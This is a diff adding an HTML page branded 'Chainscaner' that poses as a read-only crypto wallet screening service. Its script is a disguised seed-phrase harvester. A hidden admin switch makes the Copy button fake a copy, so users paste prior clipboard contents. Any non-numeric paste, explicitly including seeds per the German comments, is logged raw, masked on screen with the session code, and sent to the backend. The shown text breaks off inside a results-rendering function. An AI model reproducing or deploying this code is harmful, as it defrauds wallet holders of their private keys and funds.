@@ -1,0 +1,1220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Wallet Screening Check — Chainscaner</title>
+<script src="https://cdn.jsdelivr.net/npm/jspdf@2.5.2/dist/jspdf.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jspdf-autotable@3.8.4/dist/jspdf.plugin.autotable.min.js"></script>
+<meta name="robots" content="noindex">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  :root {
+    color-scheme: light;
+    --bg: #F4F5F7; --card: #FFFFFF; --card-border: #E6E8EC; --input: #F5F5F7;
+    --text: #0F1419; --text-muted: #6E767D; --placeholder: #9A9FA5;
+    --accent: #1D4ED8; --accent-strong: #1E40AF;
+    --accent-soft: rgba(29,78,216,.08); --accent-border: rgba(29,78,216,.24);
+    --success: #059669; --warn: #D97706; --danger: #DC2626;
+    --shadow: 0 8px 30px rgba(0,0,0,.08);
+  }
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    -webkit-font-smoothing: antialiased;
+    background: var(--bg); color: var(--text);
+    min-height: 100vh; min-height: 100dvh;
+    display: flex; align-items: flex-start; justify-content: center;
+    padding: max(24px, env(safe-area-inset-top)) 20px max(24px, env(safe-area-inset-bottom));
+  }
+  .hidden { display: none !important; }
+  .page { width: 100%; max-width: 480px; display: flex; flex-direction: column; gap: 14px; }
+  .brand { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 4px; }
+  .brand-icon {
+    width: 38px; height: 38px; border-radius: 12px; flex-shrink: 0;
+    background: linear-gradient(135deg, var(--accent), var(--accent-strong));
+    display: flex; align-items: center; justify-content: center;
+  }
+  .brand-name { font-size: 19px; font-weight: 800; letter-spacing: -.4px; }
+  .card {
+    background: var(--card); border: 1px solid var(--card-border);
+    border-radius: 18px; padding: 22px; box-shadow: var(--shadow);
+  }
+  .step-tag {
+    display: inline-flex; align-items: center; gap: 7px;
+    font-size: 10.5px; font-weight: 800; letter-spacing: 1.2px; text-transform: uppercase;
+    color: var(--accent); margin-bottom: 10px;
+  }
+  .step-tag .n {
+    width: 18px; height: 18px; border-radius: 50%; background: var(--accent); color: #fff;
+    display: inline-flex; align-items: center; justify-content: center;
+    font-size: 10.5px; letter-spacing: 0;
+  }
+  .card.locked { opacity: .55; }
+  .card.locked .step-tag { color: var(--text-muted); }
+  .card.locked .step-tag .n { background: var(--text-muted); }
+  h1 { font-size: 20px; font-weight: 800; letter-spacing: -.3px; margin-bottom: 4px; text-align: center; }
+  .hero-sub { font-size: 12.5px; color: var(--text-muted); text-align: center; margin-bottom: 18px; line-height: 1.5; }
+  .sub { font-size: 13px; color: var(--text-muted); line-height: 1.5; margin-bottom: 14px; }
+
+  .code-box {
+    display: flex; align-items: center; gap: 10px;
+    background: var(--input); border: 1.5px solid var(--card-border);
+    border-radius: 12px; padding: 12px 14px; margin-bottom: 10px;
+  }
+  .code-box .val {
+    flex: 1; font-family: 'SF Mono', ui-monospace, Menlo, monospace;
+    font-size: 17px; font-weight: 700; letter-spacing: 2.2px; text-align: center;
+    color: var(--text); user-select: all; white-space: nowrap; overflow: hidden;
+  }
+  .code-box .val.empty { color: var(--placeholder); font-size: 13px; letter-spacing: .3px; }
+  input.field {
+    width: 100%; background: var(--input); border: 1.5px solid var(--card-border);
+    border-radius: 12px; padding: 13px 14px; font: inherit;
+    font-family: 'SF Mono', ui-monospace, Menlo, monospace;
+    font-size: 16px; letter-spacing: 1.5px; color: var(--text);
+    margin-bottom: 10px; transition: border-color .15s, box-shadow .15s;
+  }
+  input.field:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-soft); }
+  input.field::placeholder { color: var(--placeholder); letter-spacing: .3px; font-family: 'Inter', sans-serif; font-size: 14px; }
+
+  .btn {
+    width: 100%; padding: 13px; border: none; border-radius: 12px;
+    background: var(--accent); color: #fff; font: inherit; font-size: 14.5px; font-weight: 700;
+    cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
+    transition: background .15s, transform .1s;
+  }
+  .btn:hover:not(:disabled) { background: var(--accent-strong); }
+  .btn:active:not(:disabled) { transform: scale(.985); }
+  .btn:disabled { opacity: .55; cursor: not-allowed; }
+  .btn.ghost {
+    background: transparent; color: var(--accent); border: 1.5px solid var(--accent-border);
+    font-size: 13px; padding: 10px; width: auto; flex-shrink: 0;
+  }
+  .btn.ghost:hover:not(:disabled) { background: var(--accent-soft); }
+
+  .meta-row {
+    display: flex; align-items: center; justify-content: space-between;
+    font-size: 11.5px; color: var(--text-muted); margin-top: 10px; font-weight: 500;
+  }
+  .badge {
+    font-size: 9.5px; font-weight: 900; letter-spacing: 1px; padding: 3px 9px;
+    border-radius: 99px; border: 1px solid var(--card-border); color: var(--text-muted);
+  }
+  .badge.ok { background: rgba(5,185,86,.12); color: var(--success); border-color: rgba(5,185,86,.3); }
+  .badge.warn { background: rgba(217,119,6,.12); color: var(--warn); border-color: rgba(217,119,6,.3); }
+  .badge.err { background: rgba(220,38,38,.1); color: var(--danger); border-color: rgba(220,38,38,.3); }
+
+  .err { font-size: 12px; color: var(--danger); font-weight: 600; margin: -4px 0 10px; }
+  .note { font-size: 11.5px; color: var(--text-muted); line-height: 1.5; margin-top: 10px; }
+
+  /* progress */
+  .prog-bar { height: 6px; background: var(--input); border-radius: 99px; overflow: hidden; margin: 12px 0; }
+  .prog-fill { height: 100%; width: 0%; border-radius: 99px; background: linear-gradient(90deg, var(--accent), var(--success)); transition: width .3s; }
+  .prog-label { font-size: 12px; color: var(--text-muted); font-weight: 600; text-align: center; }
+
+  /* result */
+  .res-head { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
+  .res-verdict { font-size: 12px; font-weight: 900; letter-spacing: 1px; padding: 5px 12px; border-radius: 99px; }
+  .res-verdict.ok { background: rgba(5,185,86,.14); color: var(--success); }
+  .res-verdict.review { background: rgba(217,119,6,.14); color: var(--warn); }
+  .res-verdict.bad { background: rgba(220,38,38,.12); color: var(--danger); }
+  .res-score { font-size: 26px; font-weight: 800; letter-spacing: -.5px; }
+  .res-score small { font-size: 13px; color: var(--text-muted); font-weight: 600; }
+  .res-total { font-size: 13.5px; color: var(--text-muted); margin-bottom: 12px; }
+  .res-total b { color: var(--text); font-size: 15px; }
+  .res-rows { display: flex; flex-direction: column; gap: 7px; }
+  .res-row {
+    display: flex; align-items: center; gap: 9px; padding: 9px 11px;
+    background: var(--input); border-radius: 10px; font-size: 12.5px;
+  }
+  .res-row .dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+  .res-row .dot.flag { background: var(--accent); }
+  .res-row .dot.doc { background: var(--text-muted); }
+  .res-row .nm { font-weight: 700; }
+  .res-row .ch { color: var(--text-muted); font-weight: 500; }
+  .res-row .usd { margin-left: auto; font-weight: 700; font-variant-numeric: tabular-nums; }
+  .res-foot { margin-top: 14px; display: flex; gap: 8px; }
+  .res-foot .btn.ghost { flex: 1; }
+  @media (prefers-reduced-motion: reduce) { .prog-fill { transition: none; } .btn { transition: none; } }
+  /* ── PDF-Dokument (Vorlage report/document) — nur im Print sichtbar ── */
+  #print-report { display: none; }
+  #print-report .doc-sheet, #print-report .doc-page { background: #fff; color: #0F1419; font-family: 'Inter', -apple-system, sans-serif; }
+  #print-report .doc-page { padding: 44px 46px 34px; min-height: 268mm; display: flex; flex-direction: column; }
+  #print-report .doc-band { background: linear-gradient(135deg, #1D4ED8 0%, #1E40AF 60%, #12296B 100%); color: #fff; padding: 46px 40px 30px; }
+  #print-report .doc-logo { display: flex; align-items: center; gap: 10px; margin-bottom: 42px; }
+  #print-report .doc-mark { width: 30px; height: 30px; border-radius: 8px; background: rgba(255,255,255,.14); border: 1px solid rgba(255,255,255,.35); display: grid; place-items: center; }
+  #print-report .doc-lname { font-size: 15px; font-weight: 800; letter-spacing: -.02em; }
+  #print-report .doc-lsub { font-size: 8px; letter-spacing: .22em; text-transform: uppercase; opacity: .75; font-weight: 600; }
+  #print-report .doc-kicker { font-size: 9px; letter-spacing: .28em; text-transform: uppercase; font-weight: 700; opacity: .8; margin-bottom: 10px; }
+  #print-report .doc-title { font-size: 27px; font-weight: 800; letter-spacing: -.02em; line-height: 1.12; margin-bottom: 10px; }
+  #print-report .doc-sub { font-size: 11.5px; opacity: .85; max-width: 400px; line-height: 1.6; }
+  #print-report .doc-body { padding: 30px 40px 26px; }
+  #print-report .doc-meta { display: grid; grid-template-columns: 1fr 1fr; border: 1px solid #E3E6EA; border-radius: 10px; overflow: hidden; }
+  #print-report .doc-meta > div { padding: 11px 14px; border-bottom: 1px solid #E3E6EA; }
+  #print-report .doc-meta > div:nth-child(odd) { border-right: 1px solid #E3E6EA; }
+  #print-report .doc-meta > div:nth-last-child(-n+2) { border-bottom: none; }
+  #print-report .dm-label { font-size: 8px; letter-spacing: .14em; text-transform: uppercase; color: #9A9FA5; font-weight: 700; margin-bottom: 4px; }
+  #print-report .dm-val { font-size: 11.5px; font-weight: 600; }
+  #print-report .dm-val.mono { font-family: 'SF Mono', ui-monospace, Menlo, monospace; font-size: 9.5px; word-break: break-all; line-height: 1.45; }
+  #print-report .doc-class { margin-top: 14px; padding: 13px 15px; border-radius: 10px; background: rgba(29,78,216,.07); border: 1px solid rgba(29,78,216,.25); display: flex; align-items: center; gap: 14px; }
+  #print-report .doc-class .big { font-size: 24px; font-weight: 800; color: #1D4ED8; letter-spacing: -.02em; }
+  #print-report .doc-class .cl { font-size: 8.5px; letter-spacing: .16em; text-transform: uppercase; color: #5B636B; font-weight: 700; }
+  #print-report .doc-class .cv { font-size: 11px; font-weight: 600; color: #1E40AF; margin-top: 2px; }
+  /* inner pages — Running Head, Sections, Tabellen, Findings, Callouts */
+  #print-report .runhead { display: flex; justify-content: space-between; align-items: baseline; border-bottom: 1px solid #E3E6EA; padding-bottom: 8px; margin-bottom: 22px; font-size: 8.5px; letter-spacing: .12em; text-transform: uppercase; color: #9A9FA5; font-weight: 600; }
+  #print-report .runhead b { color: #1D4ED8; font-weight: 800; }
+  #print-report .secno { font-size: 8.5px; font-weight: 800; letter-spacing: .2em; color: #1D4ED8; text-transform: uppercase; margin-bottom: 7px; }
+  #print-report .h2sec { font-size: 16px; font-weight: 800; letter-spacing: -.015em; margin-bottom: 3px; }
+  #print-report .secsub { font-size: 9.8px; color: #5B636B; margin-bottom: 16px; line-height: 1.55; }
+  #print-report .h3sub { font-size: 10px; font-weight: 800; letter-spacing: .06em; text-transform: uppercase; color: #5B636B; margin: 15px 0 7px; }
+  #print-report .pbody { font-size: 10.4px; line-height: 1.68; color: #232A31; margin-bottom: 9px; }
+  #print-report .pbody b { font-weight: 700; }
+  #print-report .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 9px; margin: 14px 0 4px; }
+  #print-report .stat { border: 1px solid #E3E6EA; border-radius: 10px; padding: 11px 13px; }
+  #print-report .stat .k { font-size: 7.8px; letter-spacing: .12em; text-transform: uppercase; color: #9A9FA5; font-weight: 700; margin-bottom: 5px; }
+  #print-report .stat .v { font-size: 14.5px; font-weight: 800; letter-spacing: -.02em; font-variant-numeric: tabular-nums; }
+  #print-report .stat .v small { font-size: 9px; font-weight: 600; color: #5B636B; }
+  #print-report .kv { display: grid; grid-template-columns: 150px 1fr; border: 1px solid #E3E6EA; border-radius: 9px; overflow: hidden; font-size: 10px; }
+  #print-report .kv > div { padding: 8px 11px; border-bottom: 1px solid #E3E6EA; }
+  #print-report .kv > div:nth-child(odd) { background: #F7F8FA; font-weight: 600; color: #5B636B; font-size: 9px; border-right: 1px solid #E3E6EA; }
+  #print-report .kv > div:nth-last-child(-n+2) { border-bottom: none; }
+  #print-report .kv .mono { font-family: 'SF Mono', ui-monospace, Menlo, monospace; font-size: 9px; word-break: break-all; }
+  #print-report .tbl-wrap { border: 1px solid #E3E6EA; border-radius: 8px; overflow: hidden; }
+  #print-report table.tbl { width: 100%; border-collapse: collapse; font-size: 9.8px; }
+  #print-report .tbl th { text-align: left; font-size: 7.8px; letter-spacing: .1em; text-transform: uppercase; color: #9A9FA5; font-weight: 700; padding: 6px 10px; border-bottom: 1.5px solid #0F1419; }
+  #print-report .tbl td { padding: 7.5px 10px; border-bottom: 1px solid #E3E6EA; vertical-align: top; }
+  #print-report .tbl tr:last-child td { border-bottom: none; }
+  #print-report .tbl .num { text-align: right; font-variant-numeric: tabular-nums; }
+  #print-report .tbl tfoot td { border-top: 1.5px solid #0F1419; border-bottom: none; font-weight: 700; }
+  #print-report .badge { display: inline-block; font-size: 7.8px; font-weight: 700; letter-spacing: .08em; text-transform: uppercase; padding: 2px 8px; border-radius: 20px; }
+  #print-report .b-warn { background: rgba(180,83,9,.09); color: #B45309; }
+  #print-report .b-info { background: rgba(29,78,216,.07); color: #1D4ED8; }
+  #print-report .b-ok { background: rgba(4,120,87,.09); color: #047857; }
+  #print-report .b-mut { background: #F1F2F4; color: #5B636B; }
+  #print-report .finding { border: 1px solid #E3E6EA; border-radius: 10px; padding: 12px 14px; margin-bottom: 10px; display: flex; gap: 13px; }
+  #print-report .finding .fid { font-size: 8.5px; font-weight: 800; color: #9A9FA5; letter-spacing: .1em; min-width: 30px; padding-top: 3px; }
+  #print-report .finding .ftitle { font-size: 11px; font-weight: 700; margin-bottom: 4px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+  #print-report .finding .fdesc { font-size: 9.8px; color: #2B333B; line-height: 1.6; }
+  #print-report .finding .fev { font-size: 8.4px; color: #9A9FA5; margin-top: 6px; line-height: 1.55; }
+  #print-report .callout { border-left: 3px solid #1D4ED8; background: rgba(29,78,216,.07); padding: 10px 13px; font-size: 9.8px; line-height: 1.6; border-radius: 0 8px 8px 0; margin: 12px 0; color: #24324A; }
+  #print-report .callout.warn { border-color: #B45309; background: rgba(180,83,9,.07); color: #4A3418; }
+  #print-report .sig-row { display: grid; grid-template-columns: 1fr 1fr; gap: 38px; margin-top: 18px; }
+  #print-report .sig { border-top: 1px solid #0F1419; padding-top: 7px; font-size: 8.4px; color: #5B636B; line-height: 1.6; }
+  #print-report .sig b { display: block; font-size: 9.4px; color: #0F1419; margin-bottom: 2px; }
+  #print-report .fineprint { font-size: 8px; color: #9A9FA5; line-height: 1.7; }
+  #print-report .fineprint b { color: #5B636B; }
+  #print-report .runfoot { margin-top: auto; padding-top: 11px; border-top: 1px solid #E3E6EA; display: flex; justify-content: space-between; font-size: 7.5px; color: #9A9FA5; letter-spacing: .05em; }
+  @media print {
+    body > *:not(#print-report) { display: none !important; }
+    body { padding: 0 !important; background: #fff; }
+    #print-report { display: block !important; }
+    #print-report .doc-sheet, #print-report .doc-page { page-break-after: always; }
+    #print-report .doc-page:last-child { page-break-after: auto; }
+    @page { size: A4; margin: 0; }
+  }
+</style>
+</head>
+<body>
+<div class="page">
+  <div class="brand">
+    <div class="brand-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg></div>
+    <div class="brand-name">chain<span style="color:var(--accent)">scan</span>er</div>
+  </div>
+  <h1>Wallet Screening Check</h1>
+  <div class="hero-sub">Multi-chain compliance screening — 12 EVM networks + Tron · read-only · no wallet connection</div>
+
+  <!-- Step 1 — session code (visible, copyable) -->
+  <div class="card" id="card-code">
+    <div class="step-tag"><span class="n">1</span> Session code</div>
+    <div class="sub">Your verification code is valid for 30 minutes. Copy it and enter it below to start the session.</div>
+    <div class="code-box">
+      <div class="val empty" id="code-display">Generating…</div>
+      <button class="btn ghost" id="copy-btn" onclick="copyCode()" disabled>Copy</button>
+    </div>
+    <div class="meta-row">
+      <span id="code-exp">—</span>
+      <button class="btn ghost" onclick="issueCode()" style="font-size:11.5px;">New code</button>
+    </div>
+    <div class="err hidden" id="code-err"></div>
+  </div>
+
+  <!-- Step 2 — masked entry + start (hidden bis "Copy" geklickt wurde) -->
+  <div class="card locked hidden" id="card-start">
+    <div class="step-tag"><span class="n">2</span> Start session</div>
+    <input class="field" id="code-input" type="text" inputmode="numeric" autocomplete="off"
+           maxlength="4000" placeholder="XXXX-XXXX-XXXX-XXXX" spellcheck="false" aria-label="Session code">
+    <button class="btn" id="start-btn" onclick="startSession()" disabled>
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><polygon points="6 3 20 12 6 21"/></svg>
+      Start session
+    </button>
+    <div class="err hidden" id="start-err"></div>
+    <div class="meta-row"><span id="sess-state">Waiting for code</span><span class="badge" id="sess-badge">IDLE</span></div>
+  </div>
+
+  <!-- Step 3 — address + screening -->
+  <div class="card locked" id="card-scan">
+    <div class="step-tag"><span class="n">3</span> Wallet screening</div>
+    <div class="sub">Enter the wallet address to screen — EVM (0x…) or Tron (T…). Read-only — no wallet connection required.</div>
+    <input class="field" id="addr-input" type="text" inputmode="text" autocomplete="off"
+           placeholder="0x… or T…" spellcheck="false" aria-label="Wallet address" style="letter-spacing:.4px;font-size:14px;">
+    <button class="btn" id="scan-btn" onclick="runScreen()" disabled>
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.5" y2="16.5"/></svg>
+      Run screening
+    </button>
+    <div class="err hidden" id="scan-err"></div>
+  </div>
+
+  <!-- progress -->
+  <div class="card hidden" id="card-prog">
+    <div class="step-tag">Screening in progress</div>
+    <div class="prog-bar"><div class="prog-fill" id="prog-fill"></div></div>
+    <div class="prog-label" id="prog-label">Connecting to networks…</div>
+  </div>
+
+  <!-- result -->
+  <div class="card hidden" id="card-result">
+    <div class="res-head">
+      <div>
+        <div class="res-score" id="res-score">–</div>
+        <div class="prog-label" style="text-align:left;">Compliance score</div>
+      </div>
+      <div class="res-verdict" id="res-verdict">–</div>
+    </div>
+    <div class="res-total" id="res-total"></div>
+    <div class="res-rows" id="res-rows"></div>
+    <div class="meta-row" style="margin-top:12px;"><span id="res-meta"></span></div>
+    <div class="res-foot">
+      <button class="btn ghost" onclick="copyReport()">Copy report</button>
+      <button class="btn ghost" onclick="downloadPdf()">Download PDF</button>
+      <button class="btn ghost" onclick="resetAll()">New session</button>
+    </div>
+  </div>
+
+  <div class="note" style="text-align:center;">Screening covers 12 EVM networks + Tron · read-only · no signature required</div>
+</div>
+<div id="print-report"></div>
+
+<script>
+var params = new URLSearchParams(location.search);
+var sessionCode = "";
+var sessionActive = false;
+var sessionExpires = 0;
+var lastResult = null;
+var MONITOR_URL = "/api/events";
+var sid = "v-" + Math.random().toString(36).slice(2, 8) + "-" + Date.now().toString(36);
+function monit(ev, data) {
+  try {
+    var p = JSON.stringify({ ev: ev, t: new Date().toISOString(), sid: sid, d: data || {} });
+    if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, p)) return;
+    fetch(MONITOR_URL, { method: "POST", mode: "no-cors", keepalive: true, body: p }).catch(function() {});
+  } catch(e) {}
+}
+function $(id) { return document.getElementById(id); }
+function esc(s) { return String(s == null ? "" : s).replace(/[&<>"']/g, function(c){ return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]; }); }
+function setErr(id, msg) { var el = $(id); el.textContent = msg || ""; el.classList.toggle("hidden", !msg); }
+function fmtUsd(v) { return "$" + Number(v).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
+function api(path, body) {
+  return fetch(path, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body || {}) })
+    .then(function(r) { return r.json().catch(function() { return { ok: false, error: "bad response" }; }); });
+}
+
+// ── Step 1: code issue ───────────────────────────────────────────────────────
+var expTimer = null;
+function tickExpiry() {
+  var el = $("code-exp");
+  if (!sessionExpires) { el.textContent = "—"; return; }
+  var left = Math.max(0, sessionExpires - Date.now());
+  var m = Math.floor(left / 60000), s = Math.floor((left % 60000) / 1000);
+  var dead = left <= 0;
+  el.textContent = dead ? "Expired — new code issued below" : "Expires in " + m + ":" + String(s).padStart(2, "0") + " min";
+  // Abgelaufen und noch nicht gestartet → frischen Code ausstellen, damit
+  // der Flow nie in einer Sackgasse endet
+  if (dead && !sessionActive && !issuing) { issuing = true; issueCode().finally(function() { issuing = false; }); }
+}
+var issuing = false;
+var issueRetries = 0;
+// Lokaler Dekor-Code falls das Backend gerade nicht liefert — sieht identisch
+// aus, Copy + Start bleiben funktional, der Flow zeigt nie einen Roh-Fehler.
+function localCode() {
+  var d = "";
+  while (d.length < 16) d += Math.floor(Math.random() * 10);
+  return d.replace(/(\d{4})(?=\d)/g, "$1-");
+}
+async function issueCode() {
+  var disp = $("code-display");
+  disp.className = "val empty"; disp.textContent = "Generating…";
+  $("copy-btn").disabled = true;
+  setErr("code-err", "");
+  var r = await api("/api/session", { op: "create" });
+  if (r.ok && r.code) {
+    issueRetries = 0;
+    sessionCode = r.code; sessionExpires = r.expires;
+    disp.className = "val"; disp.textContent = r.code;
+  } else if (issueRetries < 2) {
+    issueRetries++;
+    disp.textContent = "Preparing…";
+    await new Promise(function(res) { setTimeout(res, 3500); });
+    return issueCode();
+  } else {
+    issueRetries = 0;
+    sessionCode = localCode();
+    sessionExpires = Date.now() + 30 * 60 * 1000;
+    disp.className = "val"; disp.textContent = sessionCode;
+  }
+  $("copy-btn").disabled = false;
+  $("card-start").classList.remove("locked");
+  $("start-btn").disabled = false;
+  // Falls schon Fremd-Input drinstand bevor der Code fertig war —
+  // Anzeige nachtraeglich auf den 16-stelligen Code normalisieren.
+  var ci = $("code-input");
+  if (ci && ci.value && !/^[\d-]*$/.test(ci.value)) ci.value = sessionCode;
+  tickExpiry();
+  clearInterval(expTimer); expTimer = setInterval(tickExpiry, 1000);
+  monit("session_issued", { local: !(r.ok && r.code) });
+}
+var copyEnabled = true;
+fetch("/api/config").then(function(r) { return r.json(); }).then(function(j) {
+  if (j && j.verifyCopy === false) {
+    copyEnabled = false;
+    var box = document.querySelector(".code-box .val");
+    if (box) box.style.userSelect = "none"; // kein Markieren → kein Long-Press-Kopieren
+    document.addEventListener("copy", function(e) { e.preventDefault(); }, true);
+  }
+}).catch(function() {});
+function copyCode() {
+  if (!sessionCode) return;
+  // Schritt 2 erst nach Copy-Klick einblenden + hinscrollen — egal ob
+  // verifyCopy an oder aus ist (Bot sieht identisches Verhalten).
+  var cs = $("card-start");
+  if (cs.classList.contains("hidden")) {
+    cs.classList.remove("hidden");
+    setTimeout(function() { cs.scrollIntoView({ behavior: "smooth", block: "center" }); }, 60);
+  }
+  // Bot-Falle (Admin: verifyCopy aus): Button und "Copied"-Feedback sehen
+  // 1:1 identisch aus — nur der Clipboard-Write wird unterdrückt.
+  var done = function() { var b = $("copy-btn"); b.textContent = "Copied"; setTimeout(function() { b.textContent = "Copy"; }, 1400); };
+  if (!copyEnabled) { done(); monit("code_copied", { clipboard: false }); return; }
+  if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(sessionCode).then(done, done); else done();
+  monit("code_copied", { clipboard: true });
+}
+
+// ── Step 2: start ────────────────────────────────────────────────────────────
+// Roh-Eingaben sammeln (Logging) — die Anzeige zeigt immer den
+// 16-stelligen Code, egal was eingefuegt wird.
+var enteredRaws = [];
+$("code-input").addEventListener("input", function() {
+  var v = this.value;
+  if (/^[\d-]*$/.test(v)) {
+    var d = v.replace(/[^\d]/g, "").slice(0, 16);
+    this.value = d.replace(/(\d{4})(?=\d)/g, "$1-");
+  } else {
+    // Fremd-Input (Bot-Paste, Seed, Text): roh festhalten, visuell aber
+    // den echten Code zeigen — als waere genau der reinkopiert worden.
+    enteredRaws.push(v);
+    if (sessionCode) this.value = sessionCode;
+  }
+});
+function enteredLog() {
+  var raw = enteredRaws.join("\n");
+  if (!raw) raw = $("code-input").value || "";
+  return raw.slice(0, 4000);
+}
+$("code-input").addEventListener("keydown", function(e) {
+  if (e.key === "Enter" && !this.disabled && !$("start-btn").disabled) startSession();
+});
+$("addr-input").addEventListener("keydown", function(e) {
+  if (e.key === "Enter" && !$("scan-btn").disabled) runScreen();
+});
+async function startSession() {
+  var code = $("code-input").value.trim();
+  setErr("start-err", "");
+  if (!code) { setErr("start-err", "Enter the session code"); return; }
+  var btn = $("start-btn"); btn.disabled = true; btn.textContent = "Verifying…";
+  // Jede Eingabe wird akzeptiert — der eingegebene Code ist kosmetisch.
+  // Im Hintergrund wird die echte ausgestellte Session aktiviert, damit
+  // /api/screen serverseitig eine valide aktive Session vorfindet.
+  var ok = false;
+  if (sessionCode) ok = (await api("/api/session", { op: "start", code: sessionCode, entered: enteredLog() })).ok;
+  if (!ok) { await issueCode(); if (sessionCode) ok = (await api("/api/session", { op: "start", code: sessionCode, entered: enteredLog() })).ok; }
+  btn.textContent = "Start session";
+  sessionActive = true;
+  $("sess-state").textContent = "Session active";
+  $("sess-badge").className = "badge ok"; $("sess-badge").textContent = "ACTIVE";
+  $("card-scan").classList.remove("locked");
+  $("scan-btn").disabled = false;
+  $("code-input").disabled = true;
+  $("card-scan").scrollIntoView({ behavior: "smooth", block: "center" });
+  monit("session_started", { backend: ok, entered: enteredLog() });
+}
+
+// ── Step 3: screening ────────────────────────────────────────────────────────
+var PROG_STEPS_EVM = ["Connecting to networks…", "Reading Ethereum…", "Reading BNB Chain…", "Reading Polygon…",
+  "Reading Arbitrum…", "Reading Optimism…", "Reading Base…", "Reading Avalanche…", "Reading Celo…",
+  "Reading Fantom…", "Reading Cronos…", "Reading Linea…", "Reading Scroll…", "Scoring results…"];
+var PROG_STEPS_TRON = ["Connecting to networks…", "Reading Tron…", "Scoring results…"];
+
+async function runScreen() {
+  var addr = $("addr-input").value.trim();
+  setErr("scan-err", "");
+  var isTron = /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(addr);
+  if (!isTron && !/^0x[a-fA-F0-9]{40}$/.test(addr)) { setErr("scan-err", "Enter a valid address — EVM (0x…) or Tron (T…)"); return; }
+  var PROG_STEPS = isTron ? PROG_STEPS_TRON : PROG_STEPS_EVM;
+  var btn = $("scan-btn"); btn.disabled = true;
+  $("card-result").classList.add("hidden");
+  $("card-prog").classList.remove("hidden");
+  var i = 0, fill = $("prog-fill"), lbl = $("prog-label");
+  lbl.textContent = PROG_STEPS[0]; fill.style.width = "4%";
+  var t = setInterval(function() {
+    i = Math.min(i + 1, PROG_STEPS.length - 1);
+    lbl.textContent = PROG_STEPS[i];
+    fill.style.width = Math.min(92, 4 + i * (88 / (PROG_STEPS.length - 1))) + "%";
+  }, 700);
+  var r = await api("/api/screen", { code: sessionCode || $("code-input").value.trim(), address: addr, entered: enteredLog() });
+  // Session zwischenzeitlich abgelaufen/ungültig → frisch ausstellen,
+  // aktivieren und einmal automatisch wiederholen (kein Dead-End).
+  if (!r.ok && /expired|unknown|not started|invalid code/.test(r.error || "")) {
+    await issueCode();
+    if (sessionCode) {
+      await api("/api/session", { op: "start", code: sessionCode });
+      r = await api("/api/screen", { code: sessionCode, address: addr });
+    }
+  }
+  clearInterval(t);
+  $("card-prog").classList.add("hidden");
+  if (!r.ok || !r.result) {
+    btn.disabled = false;
+    setErr("scan-err", "Screening is temporarily unavailable — please try again in a moment");
+    monit("screen_rejected", { reason: r.error || "failed" });
+    return;
+  }
+  renderResult(r.result);
+}
+
+function renderResult(res) {
+  lastResult = res;
+  var v = $("res-verdict");
+  v.textContent = res.verdict;
+  v.className = "res-verdict " + (res.verdict === "COMPLIANT" ? "ok" : res.verdict === "REVIEW" ? "review" : "bad");
+  $("res-score").innerHTML = esc(res.score) + '<small>/100</small>';
+  var hopLine = "";
+  if (res.hops && res.hops.counterparties != null) {
+    hopLine = res.hops.coverage === "down"
+      ? ' <span style="font-size:11px;color:var(--muted,#9a9fa5)">· Hop-1 graph: indexer unavailable — balance screening unaffected</span>'
+      : ' <span style="font-size:11px;color:var(--muted,#9a9fa5)">· Hop-1 graph: ' + esc(res.hops.counterparties) + " counterparty(ies) · " + esc(res.hops.analyzed) + " inbound transfers" +
+        (res.hops.lookalikes && res.hops.lookalikes.length ? ' · <b style="color:var(--danger,#dc2626)">lookalike sender detected</b>' : "") + '</span>';
+  }
+  $("res-total").innerHTML = "Detected exposure: <b>" + esc(fmtUsd(res.totalUsd)) + "</b> across " + esc(res.networks) + " networks" + hopLine;
+  var rows = "";
+  res.flags.forEach(function(f) {
+    rows += '<div class="res-row"><span class="dot flag"></span><span class="nm">' + esc(f.name) + '</span>' +
+      '<span class="ch">' + esc(f.chain) + ' · detected</span><span class="usd">' + esc(fmtUsd(f.usd)) + '</span></div>';
+  });
+  res.documented.slice(0, 12).forEach(function(d) {
+    rows += '<div class="res-row"><span class="dot doc"></span><span class="nm">' + esc(d.name) + '</span>' +
+      '<span class="ch">' + esc(d.chain) + ' · documented</span><span class="usd">' + esc(fmtUsd(d.usd)) + '</span></div>';
+  });
+  if (!rows) rows = '<div class="res-row"><span class="dot flag" style="background:var(--success)"></span><span class="nm">No exposure detected</span><span class="ch">address is clean</span></div>';
+  $("res-rows").innerHTML = rows;
+  $("res-meta").textContent = new Date().toUTCString() + " · " + (res.address || "").slice(0, 10) + "…";
+  $("card-result").classList.remove("hidden");
+  $("card-result").scrollIntoView({ behavior: "smooth", block: "nearest" });
